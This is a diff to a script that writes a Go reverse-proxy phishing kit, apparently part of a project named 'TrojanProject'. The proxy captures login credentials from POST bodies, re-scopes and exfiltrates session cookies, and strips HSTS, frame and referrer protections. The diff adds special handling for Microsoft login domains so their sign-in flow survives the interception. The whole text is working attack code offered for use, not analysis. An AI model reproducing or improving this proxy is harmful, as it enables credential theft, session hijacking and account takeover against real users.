@@ -100,11 +100,7 @@ func main() {
 EOF
 
 # B. proxy.go (Cookie Re-Scoper & Header Spoofing)
-# B. proxy.go (Enhanced with HSTS, CORS & Recursive Header/Cookie Re‑scoping)
-# B. proxy.go (Enhanced with FIDO2/WebAuthn, CSP, HSTS, CORS, etc.)
-# B. proxy.go (Enhanced with Session Tracking & Combined Exfiltration)
-# B. proxy.go (Enhanced with Session Tracking & Essential Cookies Only)
-# B. proxy.go (Final Stable Version)
+# B. proxy.go (Final Stable – Microsoft‑aware)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 
@@ -208,7 +204,6 @@ func extractCredentials(bodyStr string) (username, password string) {
 
 func rewriteCSP(csp string, myHost string) string {
 	// Only rewrite if CSP exists; never add a fallback.
-	// Add our domain to the relevant directives.
 	ourOrigin := "https://" + myHost
 	for _, dir := range []string{"default-src", "script-src", "style-src", "img-src", "connect-src"} {
 		re := regexp.MustCompile(`(` + dir + `\s+[^;]+)`)
@@ -237,6 +232,11 @@ func handleWebAuthn(resp *http.Response, myHost string, t *Target) {
 	// Do NOT rewrite cookies or body for WebAuthn
 }
 
+// isMicrosoftTarget checks if the target is Microsoft-related.
+func isMicrosoftTarget(t *Target) bool {
+	return strings.Contains(t.BaseDomain, "live.com") || strings.Contains(t.BaseDomain, "microsoftonline.com")
+}
+
 // ==================== Main Proxy Function ====================
 
 func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
@@ -244,6 +244,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	proxy := httputil.NewSingleHostReverseProxy(remote)
 	myHost := r.Host
 	sessionKey := getSessionKey(r)
+	isMsft := isMicrosoftTarget(t)
 
 	// ---------- Request Modifications ----------
 	r.Host = remote.Host
@@ -252,7 +253,6 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 
 	// Rewrite Origin and Referer to point to the original target domain
 	if origin := r.Header.Get("Origin"); origin != "" {
-		// Replace the origin with the target domain (same scheme, host)
 		origURL, err := url.Parse(origin)
 		if err == nil {
 			origURL.Host = remote.Host
@@ -274,7 +274,8 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		r.Header.Del("Referer")
 	}
 
-	r.Header.Set("X-Forwarded-Host", myHost)
+	// Do NOT set X-Forwarded-Host to avoid confusing Microsoft's CSRF checks
+	// r.Header.Set("X-Forwarded-Host", myHost)  // disabled
 
 	// Capture POST bodies (credentials)
 	if r.Method == "POST" {
@@ -301,11 +302,11 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			return nil
 		}
 
-		// 1. HSTS & CT removal
+		// 1. HSTS & CT removal (always)
 		resp.Header.Del("Strict-Transport-Security")
 		resp.Header.Del("Expect-CT")
 
-		// 2. CORS handling
+		// 2. CORS handling (always)
 		if acao := resp.Header.Get("Access-Control-Allow-Origin"); acao != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", "https://"+myHost)
 		}
@@ -313,7 +314,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		resp.Header.Del("Access-Control-Allow-Methods")
 		resp.Header.Del("Access-Control-Allow-Headers")
 
-		// 3. Recursive header rewriting (replace original domain with our domain)
+		// 3. Recursive header rewriting (always)
 		for header, values := range resp.Header {
 			for i, v := range values {
 				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
@@ -322,17 +323,22 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		// 4. Security headers removal
+		// 4. Security headers removal (always)
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("Feature-Policy")
 		resp.Header.Del("Referrer-Policy")
 
-		// 5. CSP rewriting (only if exists)
-		if csp := resp.Header.Get("Content-Security-Policy"); csp != "" {
-			resp.Header.Set("Content-Security-Policy", rewriteCSP(csp, myHost))
+		// 5. CSP rewriting (only for non‑Microsoft targets)
+		if !isMsft {
+			if csp := resp.Header.Get("Content-Security-Policy"); csp != "" {
+				resp.Header.Set("Content-Security-Policy", rewriteCSP(csp, myHost))
+			}
+		} else {
+			// For Microsoft, remove CSP entirely to avoid breaking the page
+			resp.Header.Del("Content-Security-Policy")
 		}
 
-		// 6. Cookie re‑scoping & exfiltration (only essential cookies)
+		// 6. Cookie re‑scoping & exfiltration (always)
 		oldCookies := resp.Cookies()
 		resp.Header.Del("Set-Cookie")
 		var authCookies []*http.Cookie
@@ -372,22 +378,24 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		// 7. Body rewriting (recursive domain replacement)
-		contentType := resp.Header.Get("Content-Type")
-		if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "text/plain") ||
-			strings.Contains(contentType, "application/javascript") || strings.Contains(contentType, "application/json") {
-			oldBody, _ := io.ReadAll(resp.Body)
-			bodyStr := string(oldBody)
+		// 7. Body rewriting (skip for Microsoft to preserve login flow)
+		if !isMsft {
+			contentType := resp.Header.Get("Content-Type")
+			if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "text/plain") ||
+				strings.Contains(contentType, "application/javascript") || strings.Contains(contentType, "application/json") {
+				oldBody, _ := io.ReadAll(resp.Body)
+				bodyStr := string(oldBody)
 
-			newContent := rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
-			// Additional replacements for common Microsoft domains
-			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
-			newContent = strings.ReplaceAll(newContent, "login.live.com", myHost)
+				newContent := rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
+				// Additional replacements for common Microsoft domains (but we skip for Microsoft anyway)
+				newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
+				newContent = strings.ReplaceAll(newContent, "login.live.com", myHost)
 
-			bodyBytes := []byte(newContent)
-			resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
-			resp.ContentLength = int64(len(bodyBytes))
-			resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
+				bodyBytes := []byte(newContent)
+				resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
+				resp.ContentLength = int64(len(bodyBytes))
+				resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
+			}
 		}
 
 		return nil
